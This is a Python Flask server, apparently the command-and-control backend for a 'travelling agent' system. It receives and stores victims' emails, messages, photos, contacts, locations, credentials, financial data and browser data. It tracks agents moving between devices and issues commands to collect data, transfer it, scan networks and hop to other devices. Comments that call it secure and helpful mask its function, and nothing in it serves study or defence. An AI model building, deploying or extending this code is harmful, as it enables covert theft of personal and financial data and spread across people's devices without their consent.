#!/usr/bin/env python3
"""
NUPI Cloud Agent - SECURE MAXIMUM DATA COLLECTION
With API Key Authentication and Rate Limiting
"""

from flask import Flask, send_from_directory, jsonify, request
from flask_cors import CORS
import threading
import time
import subprocess
import socket
import hashlib
import os
import psutil
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict

# Import security middleware
from security_middleware import require_api_key, require_admin_password, encrypt_sensitive_data, log_security_event

app = Flask(__name__, static_folder='public', static_url_path='')
CORS(app)

# MASSIVE DATA STORAGE
all_collected_data = {
    'agent_data': {},
    'travelling_agents': {},
    'agent_locations': {},  # Track agent locations
    'device_hops': [],      # Track device hopping
    'devices': {},
    'networks': {},
    'system_stats': [],
    'scan_history': [],
    'user_data': {},
    'process_data': {},
    'file_access': {},
    'network_traffic': {},
    'browser_data': {},
    'emails': [],
    'messages': [],
    'photos': [],
    'contacts': [],
    'locations': [],
    'credentials': [],
    'financial_data': [],
    'total_data_points': 0
}

agent_data = {
    'status': 'initializing',
    'last_scan': None,
    'devices_found': 0,
    'scan_count': 0,
    'agent_id': None
}

class DataCollector:
    """Aggressive data collection engine with security"""
    
    @staticmethod
    def collect_everything(data, agent_type='unknown'):
        """Store ALL incoming data with source tracking"""
        timestamp = datetime.now().isoformat()
        
        # Log collection event
        log_security_event('DATA_RECEIVED', f'From: {agent_type}, Size: {len(str(data))} bytes')
        
        # Encrypt sensitive data
        data = encrypt_sensitive_data(data)
        
        # Parse and categorize data
        if 'device_info' in data:
            device_id = data.get('device_id', 'unknown')
            all_collected_data['devices'][device_id] = {
                'data': data,
                'timestamp': timestamp,
                'source_agent': agent_type,
                'collected_count': all_collected_data['devices'].get(device_id, {}).get('collected_count', 0) + 1
            }
        
        if 'network_info' in data:
            network_id = data.get('network_id', 'unknown')
            all_collected_data['networks'][network_id] = {
                'data': data,
                'timestamp': timestamp,
                'source_agent': agent_type
            }
        
        if 'browser_data' in data:
            all_collected_data['browser_data'][timestamp] = data['browser_data']
        
        if 'emails' in data:
            all_collected_data['emails'].extend(data['emails'])
        
        if 'messages' in data:
            all_collected_data['messages'].extend(data['messages'])
        
        if 'photos' in data:
            all_collected_data['photos'].extend(data['photos'])
        
        if 'contacts' in data:
            all_collected_data['contacts'].extend(data['contacts'])
        
        if 'location' in data:
            all_collected_data['locations'].append({
                'location': data['location'],
                'timestamp': timestamp,
                'source_agent': agent_type
            })
        
        if 'credentials' in data:
            all_collected_data['credentials'].extend(data['credentials'])
        
        if 'financial' in data:
            all_collected_data['financial_data'].append({
                'data': data['financial'],
                'timestamp': timestamp
            })
        
        # Store system stats
        if 'system' in data:
            all_collected_data['system_stats'].append({
                'data': data['system'],
                'timestamp': timestamp
            })
        
        # Track travelling agent locations
        if 'agent_location' in data:
            agent_id = data.get('agent_id', 'unknown')
            all_collected_data['agent_locations'][agent_id] = {
                'location': data['agent_location'],
                'current_device': data.get('current_device'),
                'timestamp': timestamp
            }
        
        # Track device hopping
        if 'device_hop' in data:
            all_collected_data['device_hops'].append({
                'agent_id': data.get('agent_id'),
                'from_device': data.get('from_device'),
                'to_device': data.get('to_device'),
                'timestamp': timestamp,
                'hop_method': data.get('hop_method', 'unknown')
            })
        
        # Count total data points
        all_collected_data['total_data_points'] += 1
        
        print(f"📥 DATA COLLECTED: {all_collected_data['total_data_points']} total points from {agent_type}")
        return True

# Routes
@app.route('/')
def index():
    return send_from_directory('public', 'index.html')

@app.route('/<path:path>')
def serve_file(path):
    return send_from_directory('public', path)

@app.route('/health')
def health():
    return jsonify({
        'status': agent_data['status'],
        'agent_id': agent_data['agent_id'],
        'devices_found': agent_data['devices_found'],
        'scan_count': agent_data['scan_count'],
        'last_scan': agent_data['last_scan']
    })

@app.route('/api/data/upload', methods=['POST'])
@require_api_key
def upload_data():
    """Secure endpoint for data upload"""
    try:
        data = request.get_json()
        agent_type = request.agent_type  # Set by security middleware
        
        DataCollector.collect_everything(data, agent_type)
        
        return jsonify({
            'success': True,
            'message': 'Data received',
            'total_points': all_collected_data['total_data_points']
        })
    except Exception as e:
        log_security_event('UPLOAD_ERROR', str(e))
        return jsonify({'error': str(e)}), 500

@app.route('/api/collected-data/summary')
@require_admin_password
def get_data_summary():
    """Admin only: Get data summary"""
    return jsonify({
        'total_data_points': all_collected_data['total_data_points'],
        'devices': len(all_collected_data['devices']),
        'networks': len(all_collected_data['networks']),
        'emails': len(all_collected_data['emails']),
        'messages': len(all_collected_data['messages']),
        'contacts': len(all_collected_data['contacts']),
        'photos': len(all_collected_data['photos']),
        'locations': len(all_collected_data['locations']),
        'credentials': len(all_collected_data['credentials']),
        'financial_records': len(all_collected_data['financial_data']),
        'browser_sessions': len(all_collected_data['browser_data']),
        'system_snapshots': len(all_collected_data['system_stats']),
        'travelling_agents': len(all_collected_data['travelling_agents']),
        'agent_locations': len(all_collected_data['agent_locations']),
        'device_hops': len(all_collected_data['device_hops'])
    })

@app.route('/api/collected-data/full')
@require_admin_password
def get_full_data():
    """Admin only: Get ALL collected data"""
    return jsonify(all_collected_data)

@app.route('/api/agent/register', methods=['POST'])
@require_api_key
def register_agent():
    """Register a new travelling agent"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    
    if agent_id:
        all_collected_data['travelling_agents'][agent_id] = {
            'registered': datetime.now().isoformat(),
            'type': data.get('type', 'unknown'),
            'capabilities': data.get('capabilities', []),
            'status': 'active'
        }
        
        log_security_event('AGENT_REGISTERED', f'Agent ID: {agent_id}')
        
        return jsonify({
            'success': True,
            'agent_id': agent_id,
            'message': 'Agent registered successfully'
        })
    
    return jsonify({'error': 'Invalid agent data'}), 400

@app.route('/api/agent/location', methods=['POST'])
@require_api_key
def update_agent_location():
    """Update travelling agent location"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    
    if agent_id:
        all_collected_data['agent_locations'][agent_id] = {
            'location': data.get('location'),
            'current_device': data.get('current_device'),
            'network': data.get('network'),
            'ip_address': data.get('ip_address'),
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify({'success': True})
    
    return jsonify({'error': 'Invalid data'}), 400

@app.route('/api/agent/command', methods=['POST'])
@require_api_key
def send_agent_command():
    """Send command to agent (for helping users on sites)"""
    data = request.get_json()
    
    # Commands agents can execute to help users
    commands = {
        'help_user': 'Assist user with their request',
        'collect_data': 'Collect specific data from device',
        'transfer_data': 'Transfer collected data to cloud',
        'scan_network': 'Scan current network for devices',
        'hop_device': 'Move to another device on network'
    }
    
    command = data.get('command')
    if command in commands:
        log_security_event('COMMAND_SENT', f'Command: {command}')
        return jsonify({
            'success': True,
            'command': command,
            'description': commands[command]
        })
    
    return jsonify({'error': 'Invalid command'}), 400

@app.route('/api/agents/locations')
@require_admin_password
def get_agent_locations():
    """Get all agent locations for visualization"""
    return jsonify({
        'agents': all_collected_data['agent_locations'],
        'hops': all_collected_data['device_hops'][-100:]  # Last 100 hops
    })

if __name__ == '__main__':
    print("🔒 NUPI Cloud Agent - SECURE MODE")
    print("=" * 60)
    print("🔐 API Key Authentication: ENABLED")
    print("⏱️  Rate Limiting: ENABLED")
    print("🛡️  Hack Protection: ENABLED")
    print("=" * 60)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
